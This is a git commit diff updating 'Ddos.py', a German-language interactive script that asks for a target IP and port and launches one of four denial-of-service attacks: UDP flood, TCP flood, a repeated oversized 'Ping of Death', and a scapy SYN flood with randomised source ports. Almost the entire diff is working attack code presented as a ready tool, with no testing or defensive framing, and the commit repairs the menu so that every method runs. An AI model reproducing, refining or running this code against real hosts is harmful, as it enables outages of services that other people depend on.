6f82d4aa200fc83043d31c34a40c122cec71b041
Beoky <matthiasblokk@gmail.com>
2025-01-12 22:16:23 +0100

    Update Ddos.py

--- Ddos.py
+++ Ddos.py
@@ -3,12 +3,8 @@ import os
 import socket
 import random
 from datetime import datetime
-
-# Code Time
-now = datetime.now()
-
-# Daten für Pakete
-udp_bytes = random._urandom(1490)
+import subprocess
+from scapy.all import *
 
 # Begrüßung
 os.system("clear")
@@ -17,28 +13,31 @@ print("Willkommen zum Angriffsskript!")
 print("Bitte wählen Sie eine Angriffsmethode:")
 print("1 - UDP Flood")
 print("2 - TCP Flood")
-print("3 - POD Flood")
+print("3 - POD Flood (Ping of Death)")
 print("4 - SYN Flood")
 
 # Auswahl der Methode
-method = input("Wähle die Angriffsmethode (1/2/3): ")
+method = input("Wähle die Angriffsmethode (1/2/3/4): ")
 ip = input("Ziel-IP-Adresse: ")
 port = int(input("Port (nur für UDP und TCP relevant, z. B. 80): "))
 
-# Angriffsmethoden
+# UDP Flood
 if method == "1":
-    # UDP Flood
     print("Starte UDP-Flood...")
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp_bytes = random._urandom(1490)
     sent = 0
-    while True:
-        sock.sendto(udp_bytes, (ip, port))
-        sent += 1
-        port = port + 1 if port < 65534 else 1
-        print(f"Gesendet {sent} Pakete an {ip} über Port {port}")
+    try:
+        while True:
+            sock.sendto(udp_bytes, (ip, port))
+            sent += 1
+            port = port + 1 if port < 65534 else 1
+            print(f"Gesendet {sent} Pakete an {ip} über Port {port}")
+    except KeyboardInterrupt:
+        print("UDP-Flood beendet.")
 
+# TCP Flood
 elif method == "2":
-    # TCP Flood
     print("Starte TCP-Flood...")
     sent = 0
     try:
@@ -57,27 +56,32 @@ elif method == "2":
     except KeyboardInterrupt:
         print("TCP-Flood beendet.")
 
+# Ping of Death (POD Flood)
 elif method == "3":
-    # POD Flood
-    import subprocess
+    def ping_of_death(ip):
+        print("Starte Ping of Death...")
+        try:
+            while True:
+                subprocess.run(["ping", "-s", "65507", ip], check=True)
+        except KeyboardInterrupt:
+            print("Ping of Death beendet.")
 
-def ping_of_death(ip):
-    print("Starte Ping of Death...")
-    try:
-        while True:
-            subprocess.run(["ping", "-s", "65507", ip], check=True)
-    except KeyboardInterrupt:
-        print("Ping of Death beendet.")
-        
-from scapy.all import *
-#SYN Flood
-def syn_flood(ip, port):
-    print("Starte SYN-Flood...")
-    try:
-        while True:
-            ip_layer = IP(dst=ip)
-            tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
-            packet = ip_layer / tcp_layer
-            send(packet, verbose=False)
-    except KeyboardInterrupt:
-        print("SYN-Flood beendet.")
+    ping_of_death(ip)
+
+# SYN Flood
+elif method == "4":
+    def syn_flood(ip, port):
+        print("Starte SYN-Flood...")
+        try:
+            while True:
+                ip_layer = IP(dst=ip)
+                tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
+                packet = ip_layer / tcp_layer
+                send(packet, verbose=False)
+        except KeyboardInterrupt:
+            print("SYN-Flood beendet.")
+
+    syn_flood(ip, port)
+
+else:
+    print("Ungültige Auswahl. Das Programm wird beendet.")
